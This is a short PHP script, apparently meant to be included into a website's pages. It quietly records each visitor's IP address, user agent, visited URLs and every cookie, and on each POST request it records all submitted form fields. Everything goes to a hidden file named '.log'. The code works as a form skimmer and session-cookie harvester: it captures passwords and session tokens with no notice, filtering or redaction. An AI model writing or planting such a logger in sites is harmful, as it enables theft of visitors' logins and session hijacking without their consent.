<?php
date_default_timezone_set('America/Sao_Paulo');
$logFile = '.log';

if (!function_exists('logData')) {
    function logData($data) {
        global $logFile;
        file_put_contents($logFile, $data . "\n", FILE_APPEND);
    }
}

if (!function_exists('getClientInfo')) {
    function getClientInfo() {
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        return "IP: $ip | User Agent: $userAgent";
    }
}

if (!function_exists('logNavigation')) {
    function logNavigation($url) {
        if (strpos($url, '.css') === false && strpos($url, '.js') === false) {
            $timestamp = date('Y-m-d H:i:s');
            $clientInfo = getClientInfo();
            $cookies = $_COOKIE;
            $logEntry = "$timestamp | $clientInfo | Navigated to: $url | Cookies: " . json_encode($cookies);
            logData($logEntry);
        }
    }
}

if (!function_exists('logFormSubmission')) {
    function logFormSubmission($formData) {
        $timestamp = date('Y-m-d H:i:s');
        $clientInfo = getClientInfo();
        $logEntry = "$timestamp | $clientInfo | Form Submission: " . json_encode($formData);
        logData($logEntry);
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    logNavigation($_SERVER['REQUEST_URI']);
} elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
    logFormSubmission($_POST);
}
?>
